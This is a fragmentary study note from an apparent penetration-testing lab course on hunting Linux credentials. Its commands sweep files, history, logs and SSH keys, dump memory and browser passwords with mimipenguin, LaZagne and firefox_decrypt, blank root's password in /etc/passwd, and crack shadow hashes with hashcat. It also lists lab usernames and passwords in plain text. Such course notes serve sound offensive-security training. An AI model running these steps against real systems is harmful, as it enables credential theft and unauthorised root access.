
# Credential Hunting in Linux
| **`Files`**  | **`History`**        | **`Memory`**         | **`Key-Rings`**            |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

## Files

One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:

| Configuration files | Databases | Notes    |
| ------------------- | --------- | -------- |
| Scripts             | Cronjobs  | SSH keys |
(`.config`, `.conf`, `.cnf`) not always
#### Credentials in Configuration Files
```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done >> whatevet.txt
```

```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
```shell-session

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password
```
#### Databases
```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db


DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db


DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db


```



#### Notes

```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
```
#### Scripts
```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#### Cronjobs
```shell-session
cry0l1t3@unixclient:~$ cat /etc/crontab 
```

```shell-session
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/
```


#### SSH
A file is generated for the client (`Private key`) and a corresponding one for the server (`Public key`)

`public key` is insufficient to find a `private key`
#### SSH Private Keys
```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
#### SSH Public Keys
```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## History

`.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.
#### Bash History

```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
```

#### Logs
log files that are stored in text files. Many programs, especially all services and the system itself, write such files.

|**Application Logs**|**Event Logs**|**Service Logs**|**System Logs**|
|---|---|---|---|

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |
|                       |                                                    |
find interesting content in the logs:
```shell-session
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
## Memory and Cache

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
#### Memory - Mimipenguin
`LaZagne`. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:
```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
```
```shell-session
cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
```
#### Memory - LaZagne

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```
#### Browsers
`Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

#### Firefox Stored Credentials
```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
```

```shell-session
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

"encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
```

#### Decrypting Firefox Credentials

```shell-session
AhmaDb0x@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2
```

```shell-session
cry0l1t3@unixclient:~$ python3 laZagne.py browsers
```

> LoveYou1

```undefined
whereis python3
```

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list


1 . create a file with the password Loveyou1 using the custom.rule hashcat --force /home//password1k.txt -r custom.rule --stdout | sort -u > mut_password4.list

1. use hydra to crack the new password hydra -l kira -P /home/xxx/mut_password.list
    
2. read the bash_history carefully  
    thank you and good luck
login: kira   password: L0vey0u1!

git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py



Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
login: kira   password: L0vey0u1!

# Passwd, Shadow & Opasswd

Linux Pluggable Authentication Modules is a suite of libraries that allow a Linux system administrator to configure methods to authenticate users. `PAM`
PAM also has many other service modules, such as LDAP, mount, or Kerberos.
### **How Kerberos Works in Linux:**

1. **User logs in → PAM contacts Kerberos (KDC)**
2. **KDC verifies user** → Issues a Ticket-Granting Ticket (TGT)
3. **User accesses a service** → PAM uses the TGT to request a service ticket
4. **Service verifies ticket** → Grants access without needing the password again

**A Linux-based Kerberos Realm** (Using `krb5-kdc` and `krb5-admin-server`)
`/etc/passwd` and `/etc/shadow`
## Passwd File

#### Passwd Format

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|

`/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as `root`.

#### Editing /etc/passwd - Before
```shell-session
root:x:0:0:root:/root:/bin/bash
```
#### Editing /etc/passwd - After
```shell-session
root::0:0:root:/root:/bin/bash
```
#### Root without Password
```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```
## Shadow File

| `cry0l1t3` | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` |
| ---------- | --- | ------------------------------ |
| Username   |     | Encrypted password             |
```shell-session
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```
If the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password.
`$<type>$<salt>$<hashed>`
#### Algorithm Types

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512
## Opasswd

```shell-session
AhmaDb0x@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```
## Cracking Linux Credentials


#### Unshadow
```shell-session
AhmaDb0x@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
AhmaDb0x@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
AhmaDb0x@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
#### Hashcat - Cracking Unshadowed Hashes

```shell-session
AhmaDb0x@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
#### Hashcat - Cracking MD5 Hashes

```shell-session
AhmaDb0x@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

Username: will
Password: TUqr7QfLTLhruhVbCP
J0rd@n5